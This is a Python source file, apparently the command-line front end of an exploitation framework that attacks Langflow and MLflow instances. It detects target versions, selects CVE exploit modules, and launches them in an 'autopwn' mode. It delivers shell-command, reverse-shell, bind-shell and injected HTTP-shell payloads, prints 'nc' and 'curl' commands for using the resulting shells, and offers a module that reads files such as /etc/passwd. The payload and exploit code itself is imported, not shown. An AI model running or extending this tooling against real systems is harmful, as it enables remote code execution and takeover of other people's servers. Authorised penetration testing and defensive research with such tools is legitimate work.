import logging
import socket
import time
from concurrent.futures import ThreadPoolExecutor
from concurrent.futures import TimeoutError as FutureTimeoutError
from datetime import datetime, timezone

import click
import requests

from flowhound.cli.banner import banner
from flowhound.cli.validators import (
    validate_application,
    validate_authentication,
    validate_cve,
    validate_file_path,
    validate_payload_args,
    validate_proxy,
    validate_url,
)
from flowhound.vulnerabilities.auxiliary.base_auxiliary_class import AuxiliaryBaseClass
from flowhound.vulnerabilities.cve.cve import ModuleType
from flowhound.vulnerabilities.exploits.base_exploit_class import ExploitBaseClass
from flowhound.vulnerabilities.io.database import Database
from flowhound.vulnerabilities.io.report_generation import generate_report
from flowhound.vulnerabilities.io.version_detection import detect_target
from flowhound.vulnerabilities.payloads import PAYLOAD_MAP
from flowhound.vulnerabilities.payloads.bind_langflow_http_shell import (
    BIND_LANGFLOW_HTTP_ROUTE,
)
from flowhound.vulnerabilities.payloads.bind_langflow_http_shell import (
    Payload as BindLangflowHttpShellPayload,
)
from flowhound.vulnerabilities.payloads.bind_tcp_shell import (
    Payload as BindTcpShellPayload,
)

EXPLOIT_TIMEOUT = ExploitBaseClass.TIMEOUT
logger = logging.getLogger(__name__)


def _get_payload(
    cmd: str | None,
    reverse_shell: str | None,
    bind_shell: str | None,
    bind_langflow_http: str | None,
):
    parsed = validate_payload_args(
        cmd=cmd,
        reverse_shell=reverse_shell,
        bind_shell=bind_shell,
        bind_langflow_http=bind_langflow_http,
    )

    if cmd:
        logger.info(f"Using execute_bash_command payload: {cmd!r}")
        return PAYLOAD_MAP["command"](cmd=cmd)
    elif bind_shell and parsed:
        rhost, rport = parsed
        logger.info(f"Using bind_tcp_shell payload: {rhost}:{rport}")
        return PAYLOAD_MAP["bind_shell"](rhost=rhost, rport=rport)
    elif bind_langflow_http and parsed:
        rhost, rport = parsed
        logger.info(f"Using bind_langflow_http_shell payload: {rhost}:{rport}")
        return PAYLOAD_MAP["bind_langflow_http"](rhost=rhost, rport=rport)
    elif reverse_shell and parsed:
        lhost, lport = parsed
        logger.info(f"Using reverse_tcp_shell payload: {lhost}:{lport}")
        return PAYLOAD_MAP["reverse_shell"](lhost=lhost, lport=lport)

    return None


_BIND_PROBE_TIMEOUT = 10  # seconds to wait for the victim port to open

# Langflow runs under gunicorn with (cpu_count*2)+1 uvicorn workers.  The
# injected route only lives in the one worker that executed the payload.
# Sending this many probes makes it statistically certain (>99.9% with ≤15
# workers) that at least one probe lands on the patched worker.
_BIND_HTTP_PROBE_ATTEMPTS = 30


def _probe_bind_shell(
    rhost: str, rport: int, timeout: int = _BIND_PROBE_TIMEOUT
) -> bool:
    """Attempt a TCP connection to rhost:rport using connect_ex.

    Returns True if the port is open (connect_ex == 0), False otherwise.
    This doubles as the attacker-side connection that the victim's accept()
    unblocks on — the shell is established when this succeeds.
    """
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as _s:
        _s.settimeout(timeout)
        result = _s.connect_ex((rhost, rport))
    return result == 0


def _probe_bind_langflow_http(
    rhost: str, rport: int, timeout: int = _BIND_PROBE_TIMEOUT
) -> bool:
    """POST a test command to the injected HTTP shell route.

    Retries up to _BIND_HTTP_PROBE_ATTEMPTS times to account for gunicorn
    multi-worker deployments: the route only exists in the worker that ran
    the payload, so repeated requests cycle through workers until one hits.

    Returns True as soon as any attempt gets HTTP 200, False if all fail.
    """
    url = f"http://{rhost}:{rport}{BIND_LANGFLOW_HTTP_ROUTE}"
    for _ in range(_BIND_HTTP_PROBE_ATTEMPTS):
        try:
            resp = requests.post(url, json={"cmd": "id"}, timeout=timeout)
            if resp.status_code == 200:
                body = resp.json()
                logger.info(
                    f"Shell probe output: {body.get('output', '').strip()!r}  (rc={body.get('returncode')})"
                )
                return True
        except requests.RequestException:
            pass
    return False


def _run_with_timeout(fn, *args, timeout: int = EXPLOIT_TIMEOUT, **kwargs) -> bool:
    """Submit *fn* to a single-worker pool and wait up to *timeout* seconds."""
    with ThreadPoolExecutor(max_workers=1) as executor:
        future = executor.submit(fn, *args, **kwargs)
        return future.result(timeout=timeout)


def _execute_exploit(
    exploit_module,
    base_url: str,
    username: str,
    password: str,
    proxies: dict[str, str] | None,
    payload,
    timeout: int = EXPLOIT_TIMEOUT,
) -> bool:
    """Execute an exploit module with a cross-platform timeout."""
    return _run_with_timeout(
        exploit_module.exploit,
        base_url=base_url,
        username=username,
        password=password,
        proxies=proxies,
        payload=payload,
        timeout=timeout,
    )


def _execute_auxiliary(
    auxiliary_module,
    base_url: str,
    f_path: str | None,
    username: str,
    password: str,
    proxies: dict[str, str] | None,
    timeout: int = EXPLOIT_TIMEOUT,
) -> bool:
    """Execute an auxiliary module with a cross-platform timeout."""
    return _run_with_timeout(
        auxiliary_module.run,
        base_url=base_url,
        f_path=f_path,
        username=username,
        password=password,
        proxies=proxies,
        timeout=timeout,
    )


def _detect_or_fail(
    url: str, proxy: dict[str, str] | None, application: str | None
) -> tuple[str, str]:
    logger.info(f"Detecting target application at {url}...")
    try:
        app, version = detect_target(
            base_url=url, proxies=proxy, application=application
        )
    except RuntimeError as e:
        raise click.ClickException(f"Error detecting target: {e}")

    logger.info(f"Detected {app} version {version}.")
    return app, version


def _get_vulnerabilities(
    db: Database,
    application: str,
    target_version: str,
    is_auth: bool,
    cve: str | None = None,
) -> list:
    try:
        if cve:
            res = db.search_vulnerabilities(cve=cve, module_type=ModuleType.EXPLOIT)
            if not res:
                all_res = db.search_vulnerabilities(cve=cve)
                if all_res:
                    raise click.ClickException(
                        f"CVE '{cve}' is not an exploit module (it is of type '{all_res[0].module_type}')."
                    )
                raise click.ClickException(f"CVE '{cve}' not found.")
            return res
        return db.retrieve_vulnerabilities(
            application=application,
            target_version=target_version,
            is_auth=is_auth,
            module_type=ModuleType.EXPLOIT,
        )
    except (ValueError, RuntimeError) as e:
        if isinstance(e, click.ClickException):
            raise
        raise click.ClickException(f"Error retrieving exploits: {e}")


def _get_all_modules(
    db: Database,
    application: str,
    target_version: str,
    is_auth: bool,
) -> list:
    try:
        return db.retrieve_vulnerabilities(
            application=application,
            target_version=target_version,
            is_auth=is_auth,
            module_type=None,
        )
    except (ValueError, RuntimeError) as e:
        raise click.ClickException(f"Error retrieving modules: {e}")


def _get_auxiliary_modules(db: Database, cve: str) -> list:
    try:
        res = db.search_vulnerabilities(cve=cve, module_type=ModuleType.AUXILIARY)
        if cve and not res:
            all_res = db.search_vulnerabilities(cve=cve)
            if all_res:
                raise click.ClickException(
                    f"CVE '{cve}' is not an auxiliary module (it is of type '{all_res[0].module_type}')."
                )
            raise click.ClickException(f"CVE '{cve}' not found.")
        return res
    except (ValueError, RuntimeError) as e:
        if isinstance(e, click.ClickException):
            raise
        raise click.ClickException(f"Error retrieving auxiliary module: {e!s}")


def _run_exploits(
    vuln_lst: list,
    url: str,
    username: str,
    password: str,
    proxy: dict[str, str] | None,
    payload,
    autopwn: bool,
) -> list[dict]:
    logger.info(
        f"{len(vuln_lst)} exploit(s) detected. Prioritizing unauth RCE exploits."
    )
    findings: list[dict] = []
    for vuln in vuln_lst:
        click.echo("")
        logger.info(
            f"Launching exploit for {vuln.cve_id} that impacts {vuln.application} versions {vuln.min_impacted_version} through {vuln.max_impacted_version}"
        )
        exploit_module = vuln.get_module_instance()
        if not isinstance(exploit_module, ExploitBaseClass):
            raise click.ClickException(
                f"Module loaded for {vuln.cve_id} is not an exploit module."
            )

        try:
            result = _execute_exploit(
                exploit_module=exploit_module,
                base_url=url,
                username=username,
                password=password,
                proxies=proxy,
                payload=payload,
            )
        except FutureTimeoutError:
            if payload and payload.blocking:
                # Blocking payloads (reverse shell / bind shell) keep the
                # exploit thread alive.  A timeout means the payload is still
                # running — treat it as success and fall through to the probe
                # below for bind shells.
                result = True
            else:
                logger.warning(
                    f"Exploit for {vuln.cve_id} timed out after {EXPLOIT_TIMEOUT}s. Skipping."
                )
                result = False

        # For a bind TCP shell the exploit returns as soon as the victim's
        # payload code runs, but the victim's accept() is still blocking.
        # Probe the port now — connect_ex == 0 means the listener is up and
        # this connection becomes the shell the attacker will use.
        if result and payload and isinstance(payload, BindTcpShellPayload):
            port_open = _probe_bind_shell(rhost=payload.rhost, rport=payload.rport)
            if port_open:
                logger.info(
                    f"Exploit for {vuln.cve_id} — bind shell is live on "
                    f"{payload.rhost}:{payload.rport}. Connect with: "
                    f"nc {payload.rhost} {payload.rport}"
                )
                result = True
            else:
                logger.warning(
                    f"Exploit for {vuln.cve_id} — payload ran but port "
                    f"{payload.rhost}:{payload.rport} is not reachable. "
                    "Bind shell may have failed."
                )
                result = False

        # For a bind HTTP shell, wait briefly for Starlette to compile the new
        # route into its dispatch table, then probe to confirm the route is live.
        if result and payload and isinstance(payload, BindLangflowHttpShellPayload):
            time.sleep(2)
            route_live = _probe_bind_langflow_http(
                rhost=payload.rhost, rport=payload.rport
            )
            if route_live:
                logger.info(
                    f"Exploit for {vuln.cve_id} — HTTP shell is live. "
                    f"Send commands with: "
                    f"curl -s -X POST http://{payload.rhost}:{payload.rport}{BIND_LANGFLOW_HTTP_ROUTE} "
                    f'-H "Content-Type: application/json" '
                    f'-d \'{{"cmd":"id"}}\''
                )
                result = True
            else:
                logger.warning(
                    f"Exploit for {vuln.cve_id} — payload ran but HTTP shell "
                    f"route is not reachable at "
                    f"http://{payload.rhost}:{payload.rport}{BIND_LANGFLOW_HTTP_ROUTE}."
                )
                result = False

        if isinstance(payload, BindTcpShellPayload):
            _payload_detail = f"{payload.rhost}:{payload.rport}"
        elif isinstance(payload, BindLangflowHttpShellPayload):
            _payload_detail = (
                f"{payload.rhost}:{payload.rport}{BIND_LANGFLOW_HTTP_ROUTE}"
            )
        elif payload is not None:
            # ReverseTcpShell and ExecuteBashCommand both expose their key args
            # via lhost/lport or raw_command respectively.
            _payload_detail = getattr(payload, "raw_command", None) or (
                f"{payload.lhost}:{payload.lport}"
                if hasattr(payload, "lhost")
                else None
            )
        else:
            _payload_detail = None

        findings.append(
            {
                "timestamp": datetime.now(timezone.utc).isoformat(),
                "target": url,
                "exploit": vuln.cve_id,
                "description": vuln.cve_description,
                "cvss_severity": vuln.cvss_severity,
                "auth_required": vuln.auth_required,
                "affected_versions": f"{vuln.min_impacted_version} – {vuln.max_impacted_version}",
                "payload_type": type(payload).__name__ if payload else None,
                "payload_detail": _payload_detail,
                "payload_output": exploit_module.output,
                "success": result,
            }
        )

        if not autopwn and result:
            logger.info("Exploitation successful. Stopping at first attempt.")
            break

    return findings


@click.command(help="Launch one or more exploits against a target instance.")
@click.option(
    "--url", required=True, help="URL of target instance", callback=validate_url
)
@click.option("--username", required=False, default="", help="Target instance username")
@click.option("--password", required=False, default="", help="Target instance password")
@click.option(
    "--autopwn",
    required=False,
    is_flag=True,
    default=False,
    help="Launch all available exploits, instead of stopping at first successful attempt.",
)
@click.option(
    "--proxy",
    required=False,
    default=None,
    help="HTTP(s) proxy to use for network I/O operations",
    callback=validate_proxy,
)
@click.option(
    "--command",
    "cmd",
    required=False,
    default=None,
    help="Shell command to execute on the target (uses execute_bash_command payload).",
)
@click.option(
    "--reverse_shell",
    required=False,
    default=None,
    help="LHOST:LPORT for a reverse TCP shell payload (e.g. 192.168.1.10:4444).",
)
@click.option(
    "--bind_shell",
    required=False,
    default=None,
    help="RHOST:RPORT Victim opens a TCP port for attacker to connect to (e.g. 192.168.1.30:4444).",
)
@click.option(
    "--bind_langflow_http",
    required=False,
    default=None,
    help="RHOST:RPORT Inject an HTTP shell onto the victim's existing web port (e.g. 192.168.1.30:7860).",
)
@click.option(
    "--report",
    required=False,
    default=None,
    help="Write a report of exploit results to this file (e.g. report.json, report.csv, report.xlsx).",
)
@click.option(
    "--application",
    required=False,
    default=None,
    help="Target application name (e.g. langflow, mlflow). Skips auto-detection when provided.",
    callback=validate_application,
)
@click.option(
    "--cve",
    required=False,
    default=None,
    help="Target a specific CVE (e.g. CVE-2024-1234). Limits exploitation to that CVE only.",
    callback=validate_cve,
)
@click.pass_context
def attack(
    ctx: click.Context,
    url: str,
    username: str,
    password: str,
    autopwn: bool,
    proxy: dict[str, str] | None,
    cmd: str | None,
    reverse_shell: str | None,
    bind_shell: str | None,
    bind_langflow_http: str | None,
    report: str | None,
    application: str | None,
    cve: str | None,
):
    banner()
    db: Database = ctx.obj
    payload = _get_payload(
        cmd=cmd,
        reverse_shell=reverse_shell,
        bind_shell=bind_shell,
        bind_langflow_http=bind_langflow_http,
    )
    has_credentials = validate_authentication(username=username, password=password)

    application, target_version = _detect_or_fail(
        url=url, proxy=proxy, application=application
    )

    if has_credentials:
        logger.warning(
            f"{application} login credentials detected. Results will include Auth RCE exploit modules."
        )

    vuln_lst = _get_vulnerabilities(
        db=db,
        application=application,
        target_version=target_version,
        is_auth=has_credentials,
        cve=cve,
    )

    findings = _run_exploits(
        vuln_lst=vuln_lst,
        url=url,
        username=username,
        password=password,
        proxy=proxy,
        payload=payload,
        autopwn=autopwn,
    )

    if report:
        generate_report(findings, report)


@click.command(help="Detect target application and list known exploits.")
@click.option(
    "--url",
    required=True,
    help="URL of target instance",
    callback=validate_url,
)
@click.option(
    "--proxy",
    required=False,
    default=None,
    help="HTTP(s) proxy to use for network I/O operations",
    callback=validate_proxy,
)
@click.option(
    "--application",
    required=False,
    default=None,
    help="Target application name (e.g. langflow, mlflow). Skips auto-detection when provided.",
    callback=validate_application,
)
@click.pass_context
def sniff(
    ctx: click.Context, url: str, proxy: dict[str, str] | None, application: str | None
):
    db: Database = ctx.obj

    application, target_version = _detect_or_fail(
        url=url, proxy=proxy, application=application
    )

    logger.info(
        f"Retrieving all known modules for {application} version {target_version}:"
    )
    vuln_lst = _get_all_modules(
        db=db, application=application, target_version=target_version, is_auth=True
    )

    for vuln in vuln_lst:
        logger.info(f"[{vuln.module_type}] {vuln.module}")


@click.command(help="Launch an auxiliary module against a target instance.")
@click.option(
    "--url", required=True, help="URL of target instance", callback=validate_url
)
@click.option(
    "--f_path",
    required=False,
    default=None,
    help="File path to read from (e.g. /etc/passwd).",
    callback=validate_file_path,
)
@click.option(
    "--cve",
    required=True,
    help="Target a specific CVE (e.g. CVE-2024-1234). Limits exploitation to that CVE only.",
    callback=validate_cve,
)
@click.option("--username", required=False, default="", help="Target instance username")
@click.option("--password", required=False, default="", help="Target instance password")
@click.option(
    "--proxy",
    required=False,
    default=None,
    help="HTTP(s) proxy to use for network I/O operations",
    callback=validate_proxy,
)
@click.pass_context
def scan(
    ctx: click.Context,
    url: str,
    f_path: str,
    cve: str,
    username: str,
    password: str,
    proxy: dict[str, str] | None,
):
    banner()
    db: Database = ctx.obj
    validate_authentication(username=username, password=password)

    aux_modules = _get_auxiliary_modules(db=db, cve=cve)

    for vuln in aux_modules:
        module = vuln.get_module_instance()
        logger.info(
            f"Launching Auxiliary module targeting {vuln.application} versions {vuln.min_impacted_version} through {vuln.max_impacted_version}"
        )
        if not isinstance(module, AuxiliaryBaseClass):
            raise click.ClickException(
                f"Module loaded for {vuln.cve_id} is not an auxiliary module."
            )
        _execute_auxiliary(
            auxiliary_module=module,
            base_url=url,
            f_path=f_path,
            username=username,
            password=password,
            proxies=proxy,
        )
